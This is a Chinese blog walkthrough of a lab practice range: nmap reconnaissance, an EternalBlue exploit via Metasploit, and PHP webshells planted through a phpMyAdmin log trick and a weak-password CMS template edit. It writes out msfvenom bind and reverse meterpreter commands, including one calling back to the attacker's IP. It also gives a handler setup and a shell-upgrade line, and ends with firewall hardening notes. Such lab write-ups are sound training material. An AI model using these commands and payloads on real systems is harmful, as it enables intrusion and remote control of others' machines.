---
link: https://blog.csdn.net/2403_88102829/article/details/154183640
title: 红日靶场web服务器渗透
description: 文章浏览阅读334次，点赞14次，收藏7次。随后写入一句话木马，由于该语句在运行时会报错，会被写入日志中，而日志又为php文件，所以我们通过AntSword来连接。・不能，攻击者可能采用端口欺骗（比如用 80，443 端口等），协议伪装（比如看起来像 DNS 域名查询或浏览网页）基本确定，用Nmap 半开扫描，侵略扫描（此时kali开了root权限，-A直接包含-sT，-sV，-O）发现永恒之蓝存在，为高风险等级，优先攻击它以拿到system权限，然后提取哈希凭证，再进行内网横向移动。先用arp-scan扫，更快，也可用 nmap -sn ....
keywords: 红日靶场web服务器渗透
author: Le_ee 博客等级 码龄1年
date: 2025-10-31T07:03:50.550Z
categories:
  - 靶场复现
tags:
  - 红日靶场
  - Web安全
  - 内网渗透
publisher: null
stats: paragraph=126 sentences=75, words=153
---

<meta name="referrer" content="no-referrer"/>

**一：有关信息收集，漏洞发现，漏洞利用的攻击链**

工具——nmap，arp-scan

使用范围差异

场景建议

nmap（全/深入）

可以跨网段扫描

扫描开放端口，跨网段

arp-scan（快/隐蔽）

探测同一网段内

快速发现局域网设备，绕防火墙

综：可以先用arp-scan快速定位目标，找存活主机，再用nmap深度扫描端口服务

先用arp-scan扫，更快，也可用 nmap -sn ....

![](https://i-blog.csdnimg.cn/direct/fa3984df2b0f494a8315e243e20c4c40.png)

再用Nmap 粗略扫一下该ip的端口开放情况：

![](https://i-blog.csdnimg.cn/direct/e9a8201b55174b2c801ff02bbc3e585e.png)

基本确定，用Nmap 半开扫描，侵略扫描（此时kali开了root权限，-A直接包含-sT，-sV，-O）

-p-全端口扫描

-oN输出结果到hongri.txt

![](https://i-blog.csdnimg.cn/direct/91bdbaefe6e34e219082136bd99fbd70.png)

分析结果：版本：win7 profrssional sp1（存在大量公开漏洞），操作系统：微软windows，主机名STU1,域名：GOD.ORG

关键开放端口：445/tcp——SMB服务，可利用ms17-010，极高危漏洞

1026-1028/tcp——RPC动态端口，可以服务枚举攻击，中危漏洞

并且smb签名禁用了，说明允许中间人攻击

针对漏洞扫一下，检查有没有已知的高危漏洞

![](https://i-blog.csdnimg.cn/direct/c349045af244456baeb1b5cda64b02e1.png)

发现永恒之蓝存在，为高风险等级，优先攻击它以拿到system权限，然后提取哈希凭证，再进行内网横向移动

并且我们得知了域名，后续可以尝试渗透整个GOD域

**二：ms17-010永恒之蓝漏洞**

Root权限下进入msfconsole

搜索ms17-010(永恒之蓝)漏洞

![](https://i-blog.csdnimg.cn/direct/e10185ffe37d49808513e9ef028b55a3.png)

使用第一个

![](https://i-blog.csdnimg.cn/direct/ac20315d336441f2b481f6c23c1f8f1e.png)

msfvenom制作exe病毒来获取反弹shell

![](https://i-blog.csdnimg.cn/direct/be14492c314c4bbea240be49452dc891.png)

配置有效载荷的参数

![](https://i-blog.csdnimg.cn/direct/757501d711054c9d9251f47a6dfea397.png)

运行：

![](https://i-blog.csdnimg.cn/direct/35945bed43644e7c869effb6d7bf52aa.png)

**成功获取对方win7 web 服务器的管理员shell**

![](https://i-blog.csdnimg.cn/direct/85c6c34de1b94ce29522631eb51b0255.png)

![](https://i-blog.csdnimg.cn/direct/e2686b9f92f949afbf4d465c3b0712a5.png)

**三：数据库webshell写入一句话木马**

用kali进入win7的phpMyadmin

弱密码（root/root）登录后以root用户在对方web服务器的phpMyAdmin 中查看全局日志所在位置

![](https://i-blog.csdnimg.cn/direct/b7f7dcb529f448b3b831c19cd1f4b4f1.png)执行该语句后发现路径为C:/phpStudy /MySQL/data/stu1.log

![](https://i-blog.csdnimg.cn/direct/2b48d51297004f948caf32bfadbdf20d.png)

将全局日志打开：

![](https://i-blog.csdnimg.cn/direct/85814072d5894b61acb085c941bee6bc.png)

更改全局日志的名字为hr.php，并将其放在网站的根目录下

![](https://i-blog.csdnimg.cn/direct/233e2c6102d94a8a8be2bbfaaf2b5769.png)随后写入一句话木马，由于该语句在运行时会报错，会被写入日志中，而日志又为php文件，所以我们通过AntSword来连接

![](https://i-blog.csdnimg.cn/direct/7deff985c38444dc9248294a8c9618f3.png)

蚁剑连接：

![](https://i-blog.csdnimg.cn/direct/0a995202ecdc4a1b9c29c99898d42641.png) **成功GET WEBSHELL**

![](https://i-blog.csdnimg.cn/direct/c7679cc241164d6ab19734b280df4abc.png)

* **后台弱口令爆破 + 模板注入GETSHELL()*

对后台登录页面用bp进行弱口令爆破，发现管理员用户： admin & 123456，直接登录后台

![](https://i-blog.csdnimg.cn/direct/6916e9f4a1474a628e6407351b301ba5.png)

通过点击查看，可以发现到

URL:[http://192.168.145.173:80/yxcms/index.php?r=admin/index/index#](http://192.168.145.173:80/yxcms/index.php?r=admin/index/index# "http://192.168.145.173:80/yxcms/index.php?r=admin/index/index#") 可以进行 写入php文件

新建一个shell.php文件

![](https://i-blog.csdnimg.cn/direct/82224f0952cc4b3e8cea941f7dd7bdf9.png)

写入一句话木马：

![](https://i-blog.csdnimg.cn/direct/76b363fda5a24d5f8dcef733acc4bc66.png)

通过查看yxcms的帮助手册得知，"模板"的文件路径为：

/protected/apps/default/view/default/shell.php

![](https://i-blog.csdnimg.cn/direct/2fb620d0c563448ea49e8ded8de939ae.png)

AntSword成功连接木马：

![](https://i-blog.csdnimg.cn/direct/10b6659f69c94b819e34ef9cce2bf029.png)

**Get Web Shell！:**

![](https://i-blog.csdnimg.cn/direct/9b01eb603ba14d509c1ac7195e0e73d2.png)

**补充：MSF载荷及防火墙绕过**

**shell是** **一个攻击机遥控受害机的遥控器**

**载荷（payload）是漏洞利用成功后在受害系统上运行的代码**

1.正向shell与反向shell区别：

bind_tcp：是靶机主动连接攻击机的ip与端口，建立shell连接，易受防火墙的影响（LPORT）

reverse_tcp：则第一步是靶机主动发起连接（LHOST，LPORT）

什么场景下更适合使用反向 shel1? 什么场景下更适合使用正向 shel1?

・如果是初次渗透：能出内网​默认用反向，因为防火墙对出栈检测比较弱，内网隔离环境用正向

・如果有持久化的后门，优先用反向，因为攻击机ip的变化不不影响，并且能绕过出栈防火墙

这里我们的攻击机是 **kali：192.168.145.128，目标机是win7：192.168.145.160**

区分： **正向里LPORT是目标机win7端口，反向则是攻击机kali端口**

2.有关msf

**Msf** **venom**

**生成恶意程序**

**Exploit模块**

**利用漏洞** **执行**

**Multi/Handler**

**接收连接**

**数据库模块**

**扫描结果**

**正向链接演示：**

msfvenom -p windows /x64/meterpreter/bind_tcp L PORT=5555 -f exe -o b_op.exe

恶意程序/payload/目标操作系统/系统架构/载荷类型—高级交互shell/连接方式/地址/文件格式

![](https://i-blog.csdnimg.cn/direct/7b15c6207bf04136af700314510c887a.png)

所以：b_op.exe运行后，目标机（win7 ）的5555端口开启监听

复制到win7去

![](https://i-blog.csdnimg.cn/direct/9f4c61c9c5244f19b3642bbf0da498ab.png)

Ps：root mv

**msfconsole**
use exploit/multi/handler ：通用载荷处理器
set payload windows/x64/meterpreter/bind_tcp ：正向shell
set RHOST 192.168.145.160
set LPORT 5555

![](https://i-blog.csdnimg.cn/direct/19f496be61614bacb361610656ae8bad.png)

![](https://i-blog.csdnimg.cn/direct/efa47ee6445648d2a763f48459f52b3d.png)

**run！win7打开恶意文件之后回显成功**

![](https://i-blog.csdnimg.cn/direct/0d98e09e7e4d47d5bdddc2b2a99f221f.png)

#### **反向连接演示** **：**

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.145.128 LPORT=9999 -f exe -o r_op.exe

![](https://i-blog.csdnimg.cn/direct/4f8b335d5ed64a70b89671e593cfe6c2.png)

![](https://i-blog.csdnimg.cn/direct/d8d9b5f1de934a82b41e1256a23a306b.png)

其余类比bind _shell ，注意LPORT指的是kali的端口

![](https://i-blog.csdnimg.cn/direct/8d5372f92cef43bba18bf8a4bdd2bbf9.png)

配置参数：

![](https://i-blog.csdnimg.cn/direct/c7774cbf9d08490788c4c6d655d4ffbd.png)

运行后 **成功得到目标主机的shell**

![](https://i-blog.csdnimg.cn/direct/3f8fb62021bf4a1a83ab4dee6021b370.png)

补充一个PTY（伪终端模块）升级命令：

python -c 'import pty; pty.spawn("/bin/bash")'

升级之后ctrlc功能正常，可以快捷键补全，响应快![](https://i-blog.csdnimg.cn/direct/8db03bf9c07e4deb83ace469bc37e7c9.png)

#### **防火墙加固**

win7

进入任务管理器把刚才的b_op.exe和r_op.exe结束进程，然后建立新的出站规则

![](https://i-blog.csdnimg.cn/direct/d3c044b383514c41852fec1cdeaf0d07.png)

![](https://i-blog.csdnimg.cn/direct/52ce740efcc94538a7af221cdc8fc86e.png)

仅通过配置出站规则，能否有效防御所有反向连接？

・不能，攻击者可能采用端口欺骗（比如用 80，443 端口等），协议伪装（比如看起来像 DNS 域名查询或浏览网页）

除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击？

・使用白名单 —— 只允许特定程序访问，其他一律阻止
